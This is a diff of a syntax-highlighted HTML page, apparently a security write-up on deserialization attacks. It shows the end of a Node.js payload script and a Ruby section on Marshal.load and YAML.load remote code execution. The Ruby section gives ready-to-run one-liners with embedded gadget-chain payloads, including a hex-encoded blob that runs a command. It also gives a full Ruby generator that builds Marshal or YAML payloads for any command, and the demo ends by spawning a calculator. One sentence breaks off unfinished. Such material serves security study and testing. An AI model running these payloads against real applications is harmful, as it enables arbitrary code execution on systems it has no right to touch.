+    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">serialized_object</span><span class="p">);</span>
+    <span class="c1">// Storing on file</span>
+    <span class="nx">fs</span><span class="p">.</span><span class="nx">writeFile</span><span class="p">(</span><span class="nx">argv</span><span class="p">.</span><span class="nx">file</span><span class="p">,</span> <span class="nx">serialized_object</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="k">throw</span> <span class="nx">err</span><span class="p">;</span>
+        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[+] Serializing payload&#39;</span><span class="p">);</span>
+    <span class="p">});</span>
+<span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">argv</span><span class="p">.</span><span class="nx">mode</span> <span class="o">==</span> <span class="s2">&quot;deserialize&quot;</span><span class="p">)</span> <span class="p">{</span>
+    <span class="c1">// Reading payload from file</span>
+    <span class="nx">fs</span><span class="p">.</span><span class="nx">readFile</span><span class="p">(</span><span class="nx">argv</span><span class="p">.</span><span class="nx">file</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="k">throw</span> <span class="nx">err</span><span class="p">;</span>
+        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[+] Deserializing payload&#39;</span><span class="p">);</span>
+        <span class="kd">var</span> <span class="nx">object</span> <span class="o">=</span> <span class="nx">data</span><span class="p">;</span>
+        <span class="c1">// cryo handles JSON directly - no need to JSON.parse</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nx">argv</span><span class="p">.</span><span class="nx">serializer</span> <span class="o">!=</span> <span class="s2">&quot;cryo&quot;</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nx">object</span> <span class="o">=</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">data</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">object</span><span class="p">);</span>
+        <span class="c1">// Triggering RCE</span>
+        <span class="kd">var</span> <span class="nx">deser</span> <span class="o">=</span> <span class="nx">deserialize</span><span class="p">(</span><span class="nx">argv</span><span class="p">.</span><span class="nx">serializer</span><span class="p">,</span> <span class="nx">object</span><span class="p">);</span>
+        <span class="c1">// Triggering RCE for Cryo</span>
+        <span class="nx">deser</span><span class="p">.</span><span class="nx">toString</span><span class="p">();</span>
+    <span class="p">});</span>
+<span class="p">}</span>
+</pre></div>
+
+<h4 id="references_2">References<a class="headerlink" href="#references_2" title="Permanent link"></a></h4>
+<ul>
+<li><a href="https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/">https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/</a></li>
+</ul>
 <h3 id="ruby">Ruby<a class="headerlink" href="#ruby" title="Permanent link"></a></h3>
-<h3 id="nodejs">NodeJS<a class="headerlink" href="#nodejs" title="Permanent link"></a></h3></article></body></html>
+<p>Also Ruby, as the other programs we saw previously, offer serializtion support. Within the years, two main vulnerabilities were found in Ruby that allowed RCE during the deserialization process. The affected functions were:</p>
+<ul>
+<li>Marshal.load()</li>
+<li>YAML.load()</li>
+</ul>
+<p>Originally, this vulnerability was found by <strong>Charlie Somerville</strong> during a research against Ruby on Rails, which leaded to the discovery of a gadget chain based on the <code>rails</code> module. However, the chain as it was, presented some major fallbacks:</p>
+<ul>
+<li>ActiveSupport gem must be loaded</li>
+<li>ERB from stdlib must be loaded</li>
+<li>After deserialization, a method that doesn&rsquo;t exist must be called on the deserialized object</li>
+</ul>
+<p>The above fallbacks doesn&rsquo;t affect the payload from working whithin Ruby on Rails app, as the requirements are easily fullfiled. However, they would be show stoppers for any other Ruby Application. If you want to test it, you can use the following command, seeing that it works only if we previously load <code>rails/all</code>:</p>
+<ul>
+<li>Without <code>require 'rails/all'</code>
+<div class="codehilite"><pre><span class="nv">$ </span>ruby -e <span class="s1">&#39;Marshal.load(&quot;\u0004\bo:@ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy\a:\u000E@instanceo:\bERB\u0006:\t@srcI\&quot;\u0018eval(`puts \&quot;TEST\&quot;`)\u0006:\u0006ET:\f@method:\vresult&quot;)&#39;</span>
+
+Traceback <span class="o">(</span>most recent call last<span class="o">)</span>:
+        1: from -e:1:in <span class="sb">`</span>&lt;main&gt;<span class="s1">&#39;</span>
+<span class="s1">-e:1:in `load&#39;</span>: undefined class/module ActiveSupport:: <span class="o">(</span>ArgumentError<span class="o">)</span>
+</pre></div></li>
+<li>With <code>require 'rails/all'</code>
+<div class="codehilite"><pre><span class="nv">$ </span>ruby -e <span class="s1">&#39;require &quot;rails/all&quot;;Marshal.load(&quot;\u0004\bo:@ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy\a:\u000E@instanceo:\bERB\u0006:\t@srcI\&quot;\u0018eval(`puts \&quot;TEST\&quot;`)\u0006:\u0006ET:\f@method:\vresult&quot;)&#39;</span>
+
+TEST
+</pre></div></li>
+</ul>
+<p>However, a relatively new research, made by <strong>Luke Jahnke</strong>, lead to the discovery of a POP gadget chain working with Ruby standard libs only, without any previous requirement and not realying on any adittional module.</p>
+<p>To test it, it is enough to launch the following command:</p>
+<div class="codehilite"><pre><span class="nv">$ </span>ruby -e <span class="s1">&#39;Marshal.load([&quot;0408553a1547656d3a3a526571756972656d656e745b066f3a1847656d3a3a446570656e64656e63794c697374073a0b4073706563735b076f3a1e47656d3a3a536f757263653a3a537065636966696346696c65063a0a40737065636f3a1b47656d3a3a5374756253706563696669636174696f6e083a11406c6f616465645f66726f6d4922167c636d64202f632063616c6320313e2632063a0645543a0a4064617461303b09306f3b08003a1140646576656c6f706d656e7446&quot;].pack(&quot;H*&quot;)) rescue nil&#39;</span>
+</pre></div>
+
+<p>In another post, I could see an attempt to build</p>
+<p>For the sake of completeness, I wrote the following script, that could be used to dynamically generate valid payload for both Marshal and YAML of Ruby, using the Universal Ruby 2.x RCE Gadget Chain. Even if the script is just a PoC, it can be quite useful.</p>
+<div class="codehilite"><pre><span class="ch">#!/usr/bin/env ruby</span>
+<span class="nb">require</span> <span class="s1">&#39;optparse&#39;</span>
+<span class="nb">require</span> <span class="s1">&#39;yaml&#39;</span>
+
+<span class="no">Options</span> <span class="o">=</span> <span class="no">Struct</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="ss">:save</span><span class="p">,</span><span class="ss">:encode</span><span class="p">,</span><span class="ss">:yaml</span><span class="p">,</span><span class="ss">:command</span><span class="p">,</span><span class="ss">:test</span><span class="p">)</span>
+
+<span class="k">class</span> <span class="nc">Parser</span>
+  <span class="k">def</span> <span class="nc">self</span><span class="o">.</span><span class="nf">parse</span><span class="p">(</span><span class="n">options</span><span class="p">)</span>
+    <span class="n">args</span> <span class="o">=</span> <span class="no">Options</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s2">&quot;Ruby RCE deserialization payload generator&quot;</span><span class="p">)</span>
+
+    <span class="n">opt_parser</span> <span class="o">=</span> <span class="no">OptionParser</span><span class="o">.</span><span class="n">new</span> <span class="k">do</span> <span class="o">|</span><span class="n">opts</span><span class="o">|</span>
+      <span class="n">opts</span><span class="o">.</span><span class="n">banner</span> <span class="o">=</span> <span class="s2">&quot;Usage: serializer.rb [options]&quot;</span>
+
+      <span class="n">opts</span><span class="o">.</span><span class="n">on</span><span class="p">(</span><span class="s2">&quot;-sFILE&quot;</span><span class="p">,</span> <span class="s2">&quot;--save=FILE&quot;</span><span class="p">,</span> <span class="s2">&quot;File to store payload (default=payload)&quot;</span><span class="p">)</span> <span class="k">do</span> <span class="o">|</span><span class="n">f</span><span class="o">|</span>
+        <span class="n">args</span><span class="o">.</span><span class="n">save</span> <span class="o">=</span> <span class="n">f</span>
+      <span class="k">end</span>
+      <span class="n">opts</span><span class="o">.</span><span class="n">on</span><span class="p">(</span><span class="s2">&quot;-y&quot;</span><span class="p">,</span> <span class="s2">&quot;--yaml&quot;</span><span class="p">,</span> <span class="s2">&quot;Generate YAML payload (default is False)&quot;</span><span class="p">)</span> <span class="k">do</span> <span class="o">|</span><span class="n">y</span><span class="o">|</span>
+        <span class="n">args</span><span class="o">.</span><span class="n">yaml</span> <span class="o">=</span> <span class="n">y</span>
+      <span class="k">end</span>
+      <span class="n">opts</span><span class="o">.</span><span class="n">on</span><span class="p">(</span><span class="s2">&quot;-t&quot;</span><span class="p">,</span> <span class="s2">&quot;--test&quot;</span><span class="p">,</span> <span class="s2">&quot;Attempt payload deserialization&quot;</span><span class="p">)</span> <span class="k">do</span> <span class="o">|</span><span class="n">t</span><span class="o">|</span>
+        <span class="n">args</span><span class="o">.</span><span class="n">test</span> <span class="o">=</span> <span class="n">t</span>
+      <span class="k">end</span>
+      <span class="n">opts</span><span class="o">.</span><span class="n">on</span><span class="p">(</span><span class="s2">&quot;-cCOMMAND&quot;</span><span class="p">,</span> <span class="s2">&quot;--command=COMMAND&quot;</span><span class="p">,</span> <span class="s2">&quot;Command to execute&quot;</span><span class="p">)</span> <span class="k">do</span> <span class="o">|</span><span class="n">c</span><span class="o">|</span>
+        <span class="n">args</span><span class="o">.</span><span class="n">command</span> <span class="o">=</span> <span class="n">c</span>
+      <span class="k">end</span>
+      <span class="n">opts</span><span class="o">.</span><span class="n">on</span><span class="p">(</span><span class="s2">&quot;-eENCODE&quot;</span><span class="p">,</span> <span class="s2">&quot;--encode=ENCODE&quot;</span><span class="p">,</span> <span class="s2">&quot;Encode payload (base64|hex)&quot;</span><span class="p">)</span> <span class="k">do</span> <span class="o">|</span><span class="n">e</span><span class="o">|</span>
+        <span class="n">args</span><span class="o">.</span><span class="n">encode</span> <span class="o">=</span> <span class="n">e</span>
+      <span class="k">end</span>
+      <span class="n">opts</span><span class="o">.</span><span class="n">on</span><span class="p">(</span><span class="s2">&quot;-h&quot;</span><span class="p">,</span> <span class="s2">&quot;--help&quot;</span><span class="p">,</span> <span class="s2">&quot;Prints this help&quot;</span><span class="p">)</span> <span class="k">do</span>
+        <span class="nb">puts</span> <span class="n">opts</span>
+        <span class="nb">exit</span>
+      <span class="k">end</span>
+    <span class="k">end</span>
+
+    <span class="n">opt_parser</span><span class="o">.</span><span class="n">parse!</span><span class="p">(</span><span class="n">options</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">args</span>
+  <span class="k">end</span>
+<span class="k">end</span>
+
+<span class="k">class</span> <span class="nc">Tester</span>
+    <span class="k">def</span> <span class="nc">self</span><span class="o">.</span><span class="nf">test</span><span class="p">(</span><span class="n">type</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="n">payload_file</span><span class="p">)</span>
+        <span class="nb">puts</span> <span class="s2">&quot;[*] Deserializing payload &quot;</span><span class="o">+</span> <span class="n">type</span> <span class="o">+</span><span class="s2">&quot; in place&quot;</span>
+        <span class="k">if</span> <span class="n">type</span> <span class="o">==</span> <span class="s2">&quot;yaml&quot;</span> <span class="k">then</span>
+            <span class="c1"># If we have an exception, we&#39;re quite sure we triggered the RCE</span>
+            <span class="no">YAML</span><span class="o">.</span><span class="n">load</span><span class="p">(</span><span class="no">File</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">payload_file</span><span class="p">))</span> <span class="k">rescue</span> <span class="p">(</span><span class="nb">puts</span> <span class="s2">&quot;[+] Payload Executed Successfully&quot;</span><span class="p">)</span>
+        <span class="k">else</span>
+            <span class="no">Marshal</span><span class="o">.</span><span class="n">load</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="k">rescue</span> <span class="kp">nil</span>
+        <span class="k">end</span>
+        <span class="nb">puts</span> <span class="s2">&quot;[*] Deserializing payload &quot;</span> <span class="o">+</span> <span class="n">type</span> <span class="o">+</span> <span class="s2">&quot; in new process&quot;</span>
+        <span class="k">if</span> <span class="n">type</span> <span class="o">==</span> <span class="s2">&quot;yaml&quot;</span> <span class="k">then</span>
+            <span class="c1"># If we triggered an exception above, this one should execute the command and print a visible result (and exception)</span>
+            <span class="n">cmd_string</span> <span class="o">=</span> <span class="s2">&quot;require &#39;yaml&#39;;YAML.load(File.read(&#39;&quot;</span><span class="o">+</span><span class="n">payload_file</span><span class="o">+</span><span class="s2">&quot;&#39;))&quot;</span>
+            <span class="nb">puts</span> <span class="n">cmd_string</span>
+            <span class="nb">puts</span> <span class="no">IO</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="o">[</span><span class="s2">&quot;ruby&quot;</span><span class="p">,</span><span class="s2">&quot;-e&quot;</span><span class="p">,</span> <span class="n">cmd_string</span><span class="o">]</span><span class="p">)</span><span class="o">.</span><span class="n">read</span>
+        <span class="k">else</span>
+            <span class="n">cmd_string</span> <span class="o">=</span> <span class="s2">&quot;&#39;Marshal.load(STDIN.read) rescue nil&#39;&quot;</span>
+            <span class="no">IO</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="n">cmd_string</span><span class="p">,</span> <span class="s2">&quot;r+&quot;</span><span class="p">)</span> <span class="k">do</span> <span class="o">|</span><span class="n">pipe</span><span class="o">|</span>
+                <span class="n">pipe</span><span class="o">.</span><span class="n">print</span> <span class="n">payload</span>
+                <span class="n">pipe</span><span class="o">.</span><span class="n">close_write</span>
+                <span class="nb">puts</span> <span class="n">pipe</span><span class="o">.</span><span class="n">gets</span>
+                <span class="nb">puts</span>
+            <span class="k">end</span>
+        <span class="k">end</span>
+    <span class="k">end</span>
+<span class="k">end</span>
+
+<span class="n">args</span> <span class="o">=</span> <span class="no">Parser</span><span class="o">.</span><span class="n">parse</span> <span class="no">ARGV</span>
+
+<span class="k">if</span> <span class="ow">not</span> <span class="n">args</span><span class="o">[</span><span class="ss">:command</span><span class="o">]</span> <span class="k">then</span>
+    <span class="nb">abort</span><span class="p">(</span><span class="s2">&quot;[-] Command required&quot;</span><span class="p">)</span>
+<span class="k">else</span>
+    <span class="n">command_length</span> <span class="o">=</span> <span class="n">args</span><span class="o">.</span><span class="n">command</span><span class="o">.</span><span class="n">length</span>
+    <span class="n">command</span> <span class="o">=</span> <span class="s2">&quot;|&quot;</span><span class="o">+</span><span class="n">args</span><span class="o">.</span><span class="n">command</span><span class="o">+</span><span class="s2">&quot; 1&gt;&amp;2&quot;</span>
+<span class="k">end</span>
+
+<span class="k">class</span> <span class="nc">Gem</span><span class="o">::</span><span class="no">StubSpecification</span>
+    <span class="k">def</span> <span class="nf">initialize</span><span class="p">;</span> <span class="k">end</span>
+<span class="k">end</span>
+
+<span class="n">command_tag</span> <span class="o">=</span> <span class="s2">&quot;|echo &quot;</span> <span class="o">+</span> <span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="p">(</span><span class="n">command_length</span><span class="o">-</span><span class="mi">5</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&quot; 1&gt;&amp;2&quot;</span>
+<span class="n">stub_specification</span> <span class="o">=</span> <span class="no">Gem</span><span class="o">::</span><span class="no">StubSpecification</span><span class="o">.</span><span class="n">new</span>
+<span class="n">stub_specification</span><span class="o">.</span><span class="n">instance_variable_set</span><span class="p">(</span><span class="ss">:@loaded_from</span><span class="p">,</span> <span class="n">command_tag</span><span class="p">)</span>
+
+<span class="nb">puts</span> <span class="s2">&quot;[+] Building payload&quot;</span>
+<span class="n">stub_specification</span><span class="o">.</span><span class="n">name</span> <span class="k">rescue</span> <span class="kp">nil</span>
+
+<span class="k">class</span> <span class="nc">Gem</span><span class="o">::</span><span class="no">Source</span><span class="o">::</span><span class="no">SpecificFile</span>
+    <span class="k">def</span> <span class="nf">initialize</span><span class="p">;</span> <span class="k">end</span>
+<span class="k">end</span>
+
+<span class="n">specific_file</span> <span class="o">=</span> <span class="no">Gem</span><span class="o">::</span><span class="no">Source</span><span class="o">::</span><span class="no">SpecificFile</span><span class="o">.</span><span class="n">new</span>
+<span class="n">specific_file</span><span class="o">.</span><span class="n">instance_variable_set</span><span class="p">(</span><span class="ss">:@spec</span><span class="p">,</span> <span class="n">stub_specification</span><span class="p">)</span>
+
+<span class="n">other_specific_file</span> <span class="o">=</span> <span class="no">Gem</span><span class="o">::</span><span class="no">Source</span><span class="o">::</span><span class="no">SpecificFile</span><span class="o">.</span><span class="n">new</span>
+
+<span class="n">specific_file</span> <span class="o">&lt;=&gt;</span> <span class="n">other_specific_file</span> <span class="k">rescue</span> <span class="kp">nil</span>
+
+<span class="vg">$dependency_list</span> <span class="o">=</span> <span class="no">Gem</span><span class="o">::</span><span class="no">DependencyList</span><span class="o">.</span><span class="n">new</span>
+<span class="vg">$dependency_list</span><span class="o">.</span><span class="n">instance_variable_set</span><span class="p">(</span><span class="ss">:@specs</span><span class="p">,</span> <span class="o">[</span><span class="n">specific_file</span><span class="p">,</span> <span class="n">other_specific_file</span><span class="o">]</span><span class="p">)</span>
+
+<span class="vg">$dependency_list</span><span class="o">.</span><span class="n">each</span><span class="p">{}</span> <span class="k">rescue</span> <span class="kp">nil</span>
+<span class="n">dependency_list</span> <span class="o">=</span> <span class="vg">$dependency_list</span>
+
+<span class="k">class</span> <span class="nc">Gem</span><span class="o">::</span><span class="no">Requirement</span>
+    <span class="k">def</span> <span class="nf">marshal_dump</span>
+        <span class="o">[</span><span class="vg">$dependency_list</span><span class="o">]</span>
+    <span class="k">end</span>
+<span class="k">end</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="no">Marshal</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="no">Gem</span><span class="o">::</span><span class="no">Requirement</span><span class="o">.</span><span class="n">new</span><span class="p">)</span>
+
+<span class="n">type</span> <span class="o">=</span> <span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">yaml</span> <span class="p">?</span> <span class="s2">&quot;yaml&quot;</span> <span class="p">:</span> <span class="s2">&quot;marshal&quot;</span><span class="p">)</span>
+<span class="k">if</span> <span class="n">type</span> <span class="o">==</span> <span class="s2">&quot;yaml&quot;</span> <span class="k">then</span>
+    <span class="n">ext</span> <span class="o">=</span> <span class="s2">&quot;.yml&quot;</span>
+    <span class="n">gem</span> <span class="o">=</span> <span class="no">Gem</span><span class="o">::</span><span class="no">Requirement</span><span class="o">.</span><span class="n">new</span>
+    <span class="n">gem</span><span class="o">.</span><span class="n">instance_variable_set</span><span class="p">(</span><span class="ss">:@requirements</span><span class="p">,</span> <span class="o">[</span><span class="n">dependency_list</span><span class="o">]</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="no">YAML</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="n">gem</span><span class="p">)</span>
+<span class="k">else</span>
+    <span class="n">ext</span> <span class="o">=</span> <span class="s2">&quot;.raw&quot;</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="no">Marshal</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="no">Gem</span><span class="o">::</span><span class="no">Requirement</span><span class="o">.</span><span class="n">new</span><span class="p">)</span>
+<span class="k">end</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">gsub</span><span class="p">(</span><span class="n">command_tag</span><span class="p">,</span><span class="n">command</span><span class="p">)</span>
+
+
+<span class="k">if</span> <span class="n">args</span><span class="o">[</span><span class="ss">:save</span><span class="o">]</span>
+    <span class="n">payload_file</span> <span class="o">=</span> <span class="n">args</span><span class="o">[</span><span class="ss">:save</span><span class="o">]</span> <span class="o">+</span> <span class="n">ext</span>
+    <span class="no">File</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="n">payload_file</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span> <span class="p">{</span> <span class="o">|</span><span class="n">file</span><span class="o">|</span> <span class="n">file</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="p">}</span>
+<span class="k">end</span>
+
+<span class="k">if</span> <span class="n">args</span><span class="o">[</span><span class="ss">:test</span><span class="o">]</span> <span class="k">then</span>
+    <span class="nb">puts</span> <span class="s2">&quot;[+] Deserializing payload&quot;</span>
+    <span class="no">Tester</span><span class="o">.</span><span class="n">test</span><span class="p">(</span><span class="n">type</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="n">payload_file</span><span class="p">)</span>
+<span class="k">end</span>
+
+<span class="nb">print</span> <span class="n">args</span><span class="o">.</span><span class="n">encode</span>
+<span class="n">encode</span> <span class="o">=</span> <span class="p">(</span> <span class="n">args</span><span class="o">[</span><span class="ss">:encode</span><span class="o">]</span> <span class="p">?</span> <span class="n">args</span><span class="o">[</span><span class="ss">:encode</span><span class="o">]</span> <span class="p">:</span> <span class="s2">&quot;&quot;</span><span class="p">)</span> 
+
+<span class="k">if</span> <span class="n">encode</span> <span class="o">==</span> <span class="s2">&quot;hex&quot;</span> <span class="k">then</span>
+    <span class="nb">puts</span> <span class="s2">&quot;Payload (hex):&quot;</span>
+    <span class="nb">puts</span> <span class="n">payload</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s1">&#39;H*&#39;</span><span class="p">)</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span>
+    <span class="nb">puts</span>
+<span class="k">elsif</span> <span class="n">encode</span> <span class="o">==</span> <span class="s2">&quot;base64&quot;</span>
+    <span class="nb">require</span> <span class="s1">&#39;base64&#39;</span>
+    <span class="nb">puts</span> <span class="s2">&quot;Payload (base64):&quot;</span>
+    <span class="nb">puts</span> <span class="no">Base64</span><span class="o">.</span><span class="n">encode64</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+    <span class="nb">puts</span>
+<span class="k">else</span>
+    <span class="nb">puts</span> <span class="s2">&quot;Payload (raw):&quot;</span>
+    <span class="nb">puts</span> <span class="n">payload</span>
+    <span class="nb">puts</span>
+<span class="k">end</span>
+</pre></div>
+
+<p>To test the payload, let&rsquo;s run:</p>
+<div class="codehilite"><pre>ruby -e <span class="s2">&quot;require &#39;yaml&#39;; YAML.load(File.read(&#39;payload.yml&#39;))&quot;</span>
+</pre></div>
+
+<p>A calculator will spawn on the hosting system.</p></article></body></html>
